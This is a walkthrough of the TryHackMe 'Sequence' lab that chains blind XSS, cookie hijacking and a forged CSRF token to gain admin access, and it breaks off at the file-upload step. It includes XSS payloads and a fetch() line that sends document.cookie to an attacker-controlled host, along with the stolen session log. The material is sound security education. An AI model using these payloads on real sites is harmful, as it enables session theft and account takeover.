---
title: "Sequence"
---

Sequence is a medium difficulty TryHackMe machine.
Rooting it involves chaining together a blind cross-site scripting (XSS) vulnerability, a cross site request forgery (CSRF), a file upload vulnerability and a docker escape.

**Note:** All personally identifying information, like the IP-s of attacking machines of VM-s, are replaced with placeholders for privacy and all flags or passwords are redacted to not spoil the challenge.

This room comes with a story:

> Robert made some last-minute updates to the `review.thm` website before heading
off on vacation. He claims that the secret information of the financiers is fully protected.
> But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

# Reconnaissance

## Nmap

We start with an `nmap` scan to map the attack surface:

```
$ IP=<TARGET-IP>
$ ports=$(nmap -p- --min-rate=1000 -T4 ${IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
$ sudo nmap -sS -sC -sV -O -p$ports $IP -oA sequence
[sudo] password for user:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 06:07 EET
Nmap scan report for <TARGET-IP>
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:fb:8b:4d:5d:a6:48:c7:77:76:6f:91:ed:c1:03:76 (RSA)
|   256 2d:da:07:bc:d0:4e:f6:f0:5a:1e:2b:97:60:82:ac:15 (ECDSA)
|_  256 06:89:5a:af:8d:f0:9b:78:58:44:61:b3:4b:c0:44:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Review Shop
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.7 - 4.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
```

We add the domain name `review.thm` to `/etc/hosts` so that we can resolve the domain name without a DNS server because `review.thm` is a fake TLD used in a lab environment and wouldn't resolve from a public DNS server:

```
$ echo -n $(echo $IP) review.thm | sudo tee -a /etc/hosts
<TARGET-IP> review.thm
```

We also note that the `HttpOnly` only flag is not set.
This makes XSS and other client-side attacks easier, per [PortSwigger](https://portswigger.net/kb/issues/00500600_cookie-without-httponly-flag-set):

> If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript.
> This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.

## Gobuster

We continue mapping the attack surface by fuzzing for files and directories on the server:

```
$ gobuster dir -u http://review.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 64 -x css,html,js.php,txt -e --no-error -o gobuster-sequence.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://review.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              css,html,js.php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.hta                 (Status: 403) [Size: 275]
/.hta.txt.hta.txt             (Status: 403) [Size: 275]
/.hta.html.hta.html            (Status: 403) [Size: 275]
/.hta.css.hta.css             (Status: 403) [Size: 275]
/.hta.js.php.hta.js.php          (Status: 403) [Size: 275]
/.htaccess.css.htaccess.css        (Status: 403) [Size: 275]
/.htaccess.htaccess            (Status: 403) [Size: 275]
/.htaccess.html.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.txt.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.txt.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.js.php.htpasswd.js.php     (Status: 403) [Size: 275]
/.htaccess.js.php.htaccess.js.php     (Status: 403) [Size: 275]
/.htpasswd.css.htpasswd.css        (Status: 403) [Size: 275]
/.htpasswd.html.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.htpasswd            (Status: 403) [Size: 275]
/index.phpindex.php            (Status: 200) [Size: 1694]
/javascriptjavascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/mailmail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/new.htmlnew.html             (Status: 200) [Size: 562]
/phpmyadminphpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
/server-statusserver-status        (Status: 403) [Size: 275]
/uploadsuploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
Progress: 23730 / 23730 (100.00%)
===============================================================
Finished
===============================================================
```

While the results garbled, we find the following interesting directories:

- `/javascript`
- `/mail`
- `/phpmyadmin`
- `/server-status`
- `/uploads`

Before exploring them further, we turn to the website itself for further enumeration.

## Web server

A verbose get request with `curl` shows a shop website that's likely running on a LAMP (Linux, Apache, MySQL, PHP) stack as revealed by the server headers and other information gathered so far:

```
$ curl -vL http://review.thm | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host review.thm:80 was resolved.
* IPv6: (none)
* IPv4: <TARGET-IP>
*   Trying <TARGET-IP>:80...
* Connected to review.thm (<TARGET-IP>) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 17 Jan 2026 04:13:41 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=7uf84nq5egp6aiahl9d4bk3k8e; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1694
< Content-Type: text/html; charset=UTF-8
<
{ [1694 bytes data]
100  1694  100  1694    0     0   7845      0 --:--:-- --:--:-- --:--:--  7842
* Connection #0 to host review.thm left intact
Review Shop
    * Home
    * Contact Us
****** ð Welcome to the Review Shop ******
Login Contact Us
```
Checking for `href` attributes in the HTML source code reveals links to additional pages:

```
$ curl -s http://review.thm | grep href
    <link href="/bootstrap.min.css" rel="stylesheet">
    <a class="navbar-brand" href="dashboard.php">Review Shop</a>
          <a class="nav-link" href="dashboard.php">Home</a>
            <a class="nav-link" href="contact.php">Contact Us</a>
    <a href="login.php" class="btn btn-primary me-2">Login</a>
    <a href="contact.php" class="btn btn-outline-secondary">Contact Us</a>
```

We keep these in mind for later.
Instead, we turn to the `/mail` directory to find directory indexing enabled:

```
$ curl -s http://review.thm/mail/ | html2text
****** Index of /mail ******
[[ICO]]       Name             Last modified    Size Description
===========================================================================
[[PARENTDIR]] Parent Directory                     -  
[[TXT]]       dump.txt         2025-06-04 10:12  701  
===========================================================================
     Apache/2.4.41 (Ubuntu) Server at review.thm Port 80
```

**Directory indexing** is a server feature where the server lists the contents of a directory if it doesn't find an index file (e.g. `index.html`).
Originally a useful feature for serving files, it is now largely a security risk because it can disclose sensitive information.
This is precisely the case here because `dump.txt` reveals information about the back-end infrastructure and discloses a password together with a potential username - `robert`:

```
$ curl -s http://review.thm/mail/dump.txt
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (<redacted>), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,
Robert
```

`/dashboard.php` redirects to `/login.php`:

```
$ curl -vL http://review.thm/dashboard.php | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host review.thm:80 was resolved.
* IPv6: (none)
* IPv4: <TARGET-IP>
*   Trying <TARGET-IP>:80...
* Connected to review.thm (<TARGET-IP>) port 80
* using HTTP/1.x
> GET /dashboard.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Sat, 17 Jan 2026 04:23:36 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=k6s50026f511dpa88mdhvn3plh; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: login.php
< Content-Length: 1400
< Content-Type: text/html; charset=UTF-8
* Ignoring the response-body
* setting size while ignoring
<
100  1400  100  1400    0     0   6488      0 --:--:-- --:--:-- --:--:--  6511
* Connection #0 to host review.thm left intact
* Issue another request to this URL: 'http://review.thm/login.php'
* Re-using existing http: connection with host review.thm
> GET /login.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 17 Jan 2026 04:23:36 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=vdnet99o1ftnco3drpl3h1uvoe; path=/; domain=.review.thm
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1944
< Content-Type: text/html; charset=UTF-8
<
{ [883 bytes data]
100  1944  100  1944    0     0   5960      0 --:--:-- --:--:-- --:--:--  5960
* Connection #0 to host review.thm left intact
Review Shop
    * Home
    * Contact Us
***** Login *****
Username or Email:[email               ]
Password:[********************]
Login
```

We have a password and a potential username.
Before trying it, we explore other parts of the site.

`/contact.php` let's us send messages:

```
$ curl -s http://review.thm/contact.php | html2text
Review Shop
    * Home
    * Contact Us
***** Contact Us *****
Name:[name                ]
Phone:[phone               ]
Send
```

The HTML source shows that sending messages involves a POST request with `name`, `phone` & `message` parameters:

```
$ curl -s http://review.thm/contact.php
[…]
<div class="container mt-5">
    <h2>Contact Us</h2>
        <form method="POST" class="mt-3">
        <div class="mb-3">
            <label>Name:</label>
            <input type="text" name="name" class="form-control" required />
        </div>
        <div class="mb-3">
            <label>Phone:</label>
            <input type="text" name="phone" class="form-control" required />
        </div>
        <div class="mb-3">
            <label>Message:</label>
            <textarea name="message" class="form-control" required></textarea>
        </div>
        <button type="submit" class="btn btn-success">Send</button>
    </form>
</div>
[…]
```

We send a test message to understand the intended functionality of the website.
The website informs us that someone is going to review our message:

```
$ curl -s  http://review.thm/contact.php -d 'name=test&phone=555-555-555&message=test' | html2text
Review Shop
    * Home
    * Contact Us
***** Contact Us *****
Thank you for your feedback! Someone from our team will review it shortly.
Name:[name                ]
Phone:[phone               ]
Send
```

If that someone does it in a browser, we might be able to perform a blind XSS attack to steal their cookies and hijack their session.
A **blind XSS** attack involves getting the server to store an XSS payload and run it when someone else view the page where it was stored in a back-end application.

To perform this attack, we must start a listening server, send an XSS payload as a value of the `message` parameter and catch the response.
A straightforward way to test this would be to use a payload that sends the user's cookie to us:

```
<scritp>document.location='http://<ATTACKER-IP>/cookie?c=' + document.cookie</script>
```

A shortcoming of this approach is that we would have to send another message if we wanted to use different payloads.
Instead, we will use a payload that fetches a `.js` script on our server.
It runs when the user views our message in the browser.
We can vary the content of the script and execute different payloads that way without spamming the target with new messages and creating further suspicion.
(If they were to view our message only once, we can always resort to sending multiple messages.)

Start a server on the attacking machine:

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Before creating the script, we want to test if the payload even works and the target machine reaches out to us.
So we send the following XSS payload:

```
$ curl -s  http://review.thm/contact.php -d 'name=test&phone=555-555-555&message=<script src="http://<ATTACKER-IP>:8000/pwn.js"></script>' | html2text
Review Shop
    * Home
    * Contact Us
***** Contact Us *****
Thank you for your feedback! Someone from our team will review it shortly.
Name:[name                ]
Phone:[phone               ]
Send
```

And we get a hit on our server, confirming the payload works:

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<TARGET-IP> - - [17/Jan/2026 06:38:04] code 404, message File not found
<TARGET-IP> - - [17/Jan/2026 06:38:04] "GET /pwn.js HTTP/1.1" 404 -
```

# Cookie hijacking

**Cookie hijacking** involves stealing a user's cookie to impersonate them and to gain unauthorized access to their account or take over their session.

After confirming our payload, we can proceed with attempting to steal the user's cookie.
Since the target is already querying for `pwn.js`, let's create one:

```
$ cat > pwn.js <<EOF
heredoc> fetch("http://<ATTACKER-IP>:8000/?c="+document.cookie)
heredoc> EOF
```

We closed the server to avoid the terminal being filled with `404` messages.
Restart it again to get the cookie:

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<TARGET-IP> - - [17/Jan/2026 06:45:41] "GET /pwn.js HTTP/1.1" 200 -
<TARGET-IP> - - [17/Jan/2026 06:45:41] "GET /?c=PHPSESSID=6ladf6vk7rfllm5oful6d06k7e HTTP/1.1" 200 -
```

Making another GET request to `/dashboard.php` with the hijacked cookie gives us the `mod` flag:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <MOD-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as mod.
Logout View Feedback Open Chat Settings
===============================================================================
*** User Table ***
ID Username Role
2  admin    admin
3  mod      mod
```

# CSRF

Checking the HTML source of `/dashboard.php`, we find more interesting pages - `chat.php`, `admin_view.php`, `setting.php`:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' | grep href
    <link href="/bootstrap.min.css" rel="stylesheet">
    <a class="navbar-brand" href="dashboard.php">Review Shop</a>
          <a class="nav-link" href="dashboard.php">Home</a>
            <a class="nav-link" href="chat.php">Chat</a>
              <a class="nav-link" href="admin_view.php">View Feedback</a>
            <a class="nav-link" href="settings.php">Settings</a>
            <a class="nav-link" href="contact.php">Contact Us</a>
            <a class="nav-link" href="contact.php"><MOD-FLAG></a>
        <a href="logout.php" class="btn btn-outline-light btn-sm">Logout</a>
            <a href="logout.php" class="btn btn-outline-danger me-2">Logout</a>
                            <a href="admin_view.php" class="btn btn-primary me-2">View Feedback</a>
                        <a href="chat.php" class="btn btn-success me-2">Open Chat</a>
            <a href="settings.php" class="btn btn-warning">Settings</a>
```

Starting with `/chat.php`, we note a message which implies that some kind of XSS filtering is present for user messages:

```
$ curl -s http://review.thm/chat.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <MOD-FLAG>
Hi, mod Logout
** Chats **
×
[Bot]
Admin
Online
===============================================================================
Alice
I would like to discuss about potential investment with the company
☰ Chats Profile
[message             ]Send
** Your Profile **
[male.png]
* Admin *
** ⚠️ Malicious Input Detected **
Your message contains suspicious content. Please remove it and try again.
Okay
", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval",
"document.cookie", "window.location"]; for (let keyword of dangerous) { if
(msg.includes(keyword)) { e.preventDefault(); const modal = new bootstrap.Modal
(document.getElementById("warningModal")); modal.show(); break; } } });
```

The HTML source of `chat.php` reveals a client-side script that filters for common words in XSS payloads.
We also see that messages are posted as values of the `message` parameter with POST requests to `chat.php`:

```
$ curl -s http://review.thm/chat.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e'
[…]
<form method="post" action="chat.php" class="d-flex" id="chatForm">
                <input type="text" name="message" class="form-control me-2" placeholder="Type your message..." required autocomplete="off">
        <button type="submit" class="btn btn-success">Send</button>
</form>
[…]
<script>
document.getElementById("chatForm").addEventListener("submit", function(e) {
    const msg = document.querySelector('input[name="message"]').value.toLowerCase();
    const dangerous = ["<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];
    for (let keyword of dangerous) {
        if (msg.includes(keyword)) {
            e.preventDefault();
            const modal = new bootstrap.Modal(document.getElementById("warningModal"));
            modal.show();
            break;
        }
    }
});
</script>
[…]
```

Since this is client-side filtering, we could try to bypass it by removing the script either in the browser developer tools or in a proxy like Burp Suite.

Before exploring these options, we check out the other pages.
`/admin_view.php` shows the messages we've sent and is thus the page that is vulnerable to blind XSS:

```
$ curl -s http://review.thm/admin_view.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e'
[…]
<div class="container mt-5">
    <h2>Feedback Submissions</h2>
            <div class="card my-3">
            <div class="card-body">
                <h5 class="card-title">test</h5>
                <p><strong>Phone:</strong> 555-555-555</p>
                <p><strong>Message:</strong><br><script src="http://<ATTACKER-IP>:8000/pwn.js"></script></p>
                <p class="text-muted">Submitted on: 2026-01-17 04:38:01</p>
            </div>
        </div>
[…]
```

The `settings.php` page has a few interesting functions.
Besides changing our password, we can also promote someone to admin or co-admin:

```
$ curl -s http://review.thm/settings.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <MOD-FLAG>
Hi, mod Logout
**** âï¸ Settings Panel ****
Change Password
[********************]
Update Password
Promote Co-Admin
[username            ]
Promote to Admin
```

The HTML source of `settings.php` shows that both reset password and promote co-admin functions are handled by JS scripts.
The first script makes a POST request to `/update_password.php` with a `new_password` parameter.
The second makes a GET request to `/promote_coadmin.php` with a `username` parameter.
Both also include the same CSRF token in their requests:

```
$ curl -s http://review.thm/settings.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e'
[…]
<div class="container mt-5">
    <h3 class="mb-4">⚙️ Settings Panel</h3>

    <!-- Change Password Form -->
    <div class="card mb-4">
        <div class="card-header">Change Password</div>
        <div class="card-body">
            <form id="passwordForm">
                <div class="mb-3">
                    <input type="password" class="form-control" name="new_password" placeholder="Enter new password" required>
                    <input type="hidden" name="csrf_token" value="ad148a3ca8bd0ef3b48c52454c493ec5">
                </div>
                <button type="submit" class="btn btn-primary">Update Password</button>
            </form>
            <div id="passwordResult" class="mt-3"></div>
        </div>
    </div>


    <div class="card">
        <div class="card-header">Promote Co-Admin</div>
        <div class="card-body">
            <form id="coAdminForm">
                <div class="mb-3">
                    <input type="text" class="form-control" name="username" placeholder="Enter username to promote" required>
                                        <input type="hidden" name="csrf_token_promote" value="ad148a3ca8bd0ef3b48c52454c493ec5">
                </div>
                <button type="submit" class="btn btn-warning">Promote to Admin</button>
            </form>
            <div id="coAdminResult" class="mt-3"></div>
        </div>
    </div>
</div>

<script>
// Handle Change Password (POST)
document.getElementById("passwordForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const form = e.target;
    const data = new FormData(form);

    fetch('update_password.php', {
        method: 'POST',
        body: data
    })
    .then(res => res.text())
    .then(html => {
        document.getElementById("passwordResult").innerHTML = html;
        form.reset();
    });
});

// Handle Promote Co-Admin (GET)
document.getElementById("coAdminForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const form = e.target;
    const params = new URLSearchParams(new FormData(form)).toString();

    fetch('promote_coadmin.php?' + params, {
        method: 'GET'
    })
    .then(res => res.text())
    .then(html => {
        document.getElementById("coAdminResult").innerHTML = html;
        form.reset();
    });
});
</script>

</body>
</html>
```
We confirm that the token is a MD5 hash (`hashid` usually displays such results when given an MD5 hash):

```
$ echo -n 'ad148a3ca8bd0ef3b48c52454c493ec5' | hashid
Analyzing 'ad148a3ca8bd0ef3b48c52454c493ec5'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

Suspecting this might be a username, we write it to a file and try to crack the hash with `john`:

```
$ echo -n 'ad148a3ca8bd0ef3b48c52454c493ec5' > csrf_token.txt
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt csrf_token.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
mod              (?)
1g 0:00:00:00 DONE (2026-01-17 07:21) 25.00g/s 1219Kp/s 1219Kc/s 1219KC/s nardam76..mgriffin
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

The token's value is simply the MD5 hash of the username.
This is bad practice because the user controls the token.

A **Cross-Site Request Forgery** (CSRF) [attack](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html):

> occurs when a malicious web site, email, blog, instant message, or program tricks an authenticated user's web browser into performing an unwanted action on a trusted site.
> If a target user is authenticated to the site, unprotected target sites cannot distinguish between legitimate authorized requests and forged authenticated requests.

We'll attempt a CSRF attack to get the admin to elevate our current `mod` user a co-admin by sending a request with a forged `csrf_token_promote`.
The first step is to forge the token by creating a new MD5 hash for the `admin` username:

```
$ echo -n 'admin' | md5sum
21232f297a57a5a743894a0e4a801fc3  -
```

Next, we change our password so that we'll be assigned a new cookie once we log in after we've been made co-admin:

```
$ curl -sL http://review.thm/update_password.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' -d 'new_password=password123&csrf_token=ad148a3ca8bd0ef3b48c52454c493ec5'
Password updated successfully. <a href='settings.php'>Refresh</a>
```

Check the settings page again to refresh and confirm the changes:

```
$ curl -s http://review.thm/settings.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e'
```

Send a message to the chat with our forged `csrf_token_promote` and `username=mod` to get our current user promoted to co-admin:

```
$ curl -s http://review.thm/chat.php -b 'PHPSESSID=6ladf6vk7rfllm5oful6d06k7e' -d 'message= http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3' | html2text
```

HTML source shows that logging in involves a post request with `email` and `password` parameters:

```
$ curl -s http://review.thm/login.php
[…]
<div class="container mt-5">
    <h2>Login</h2>
        <form method="POST" class="mt-3">
        <div class="mb-3">
            <label>Username or Email:</label>
            <input type="text" name="email" class="form-control" required />
        </div>
        <div class="mb-3">
            <label>Password:</label>
            <input type="password" name="password" class="form-control" required />
        </div>
        <button type="submit" class="btn btn-success">Login</button>
    </form>
</div>
[…]
```

Login again as `mod` to grab the new cookie (we could also have used the `-c` flag to save the cookie in a file and the `-b` flag to send it in all subsequent requests; this would have forwarded us to `/dashboard.php`):

```
$ curl -vL http://review.thm/login.php -d 'email=mod&password=password123' | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host review.thm:80 was resolved.
* IPv6: (none)
* IPv4: <TARGET-IP>
*   Trying <TARGET-IP>:80...
* Connected to review.thm (<TARGET-IP>) port 80
* using HTTP/1.x
> POST /login.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
> Content-Length: 30
> Content-Type: application/x-www-form-urlencoded
>
} [30 bytes data]
* upload completely sent off: 30 bytes
< HTTP/1.1 302 Found
< Date: Sat, 17 Jan 2026 06:08:31 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c; path=/; domain=.review.thm
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
* Need to rewind upload for next request
< Location: dashboard.php
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
* Ignoring the response-body
* setting size while ignoring
<
100    30    0     0  100    30      0    136 --:--:-- --:--:-- --:--:--   136
* Connection #0 to host review.thm left intact
* Issue another request to this URL: 'http://review.thm/dashboard.php'
* Re-using existing http: connection with host review.thm
> GET /dashboard.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Sat, 17 Jan 2026 06:08:32 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=57hd1vqqhe3pvd5uvqeul9tpmn; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: login.php
< Content-Length: 1400
< Content-Type: text/html; charset=UTF-8
* Ignoring the response-body
* setting size while ignoring
<
100  1400  100  1400    0     0   4284      0 --:--:-- --:--:-- --:--:--  4284
* Connection #0 to host review.thm left intact
* Issue another request to this URL: 'http://review.thm/login.php'
* Re-using existing http: connection with host review.thm
> GET /login.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 17 Jan 2026 06:08:32 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=jjo0oiqfca3iff2mgoktf3glk4; path=/; domain=.review.thm
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1944
< Content-Type: text/html; charset=UTF-8
<
{ [1944 bytes data]
100  1944  100  1944    0     0   4477      0 --:--:-- --:--:-- --:--:--  4477
* Connection #0 to host review.thm left intact
Review Shop
    * Home
    * Contact Us
***** Login *****
Username or Email:[email               ]
Password:[********************]
Login
```

We can access `/dashboard.php` with our new cookie to confirm that we're admin and get the admin flag:

```
$ curl -vL http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host review.thm:80 was resolved.
* IPv6: (none)
* IPv4: <TARGET-IP>
*   Trying <TARGET-IP>:80...
* Connected to review.thm (<TARGET-IP>) port 80
* using HTTP/1.x
> GET /dashboard.php HTTP/1.1
> Host: review.thm
> User-Agent: curl/8.15.0
> Accept: */*
> Cookie: PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 17 Jan 2026 06:09:15 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 3285
< Content-Type: text/html; charset=UTF-8
<
{ [961 bytes data]
100  3285  100  3285    0     0  15609      0 --:--:-- --:--:-- --:--:-- 15642
* Connection #0 to host review.thm left intact
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
```

# Foothold

Our next step is to gain a foothold on the server.
HTML source shows that the new select feature function on `dashboard.php` involves a POST request to `/dashboard.php` with a `feature` parameter:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c'
[…]
<form method="post" enctype="multipart/form-data" class="mb-4">
    <div class="row g-2 align-items-center">
        <div class="col-md-4">
            <select name="feature" class="form-select" onchange="this.form.submit()">
                <option value="">-- Select Feature --</option>
                <option value="lottery.php" >Lottery Feature</option>
            </select>
        </div>
    </div>
</form>
[…]
```

Recall that there's also a `/finance.php` page as well.
We can access it with the `feature=finance.php` parameter:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=finance.php' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
**** ð Enter Password to Access Finance Panel ****
[********************]
Unlock
***** Investor Finance Table *****
ID Investor Name    Invested Amount Equity (%) Contact
1  Alice Ventures   $100,000        20%        alice@finance.thm
2  Bob Capital      $250,000        35%        bob@finance.thm
3  Charlie Group    $80,000         15%        charlie@finance.thm
4  Delta Fund       $300,000        40%        delta@finance.thm
5  Echo Investments $150,000        25%        echo@finance.thm
**** ð¤ Upload Latest Investor Details ****
0px;">
Upload
```

This page allows us to upload files but seems to require a password.
Accessing the same page in a browser hides the page behind a password overlay.

HTML source shows that the overlay takes input in a `finance-accessPassword` parameter.
The file upload requires an `investor_file` parameter in a POST request to `/finance.php`:

```
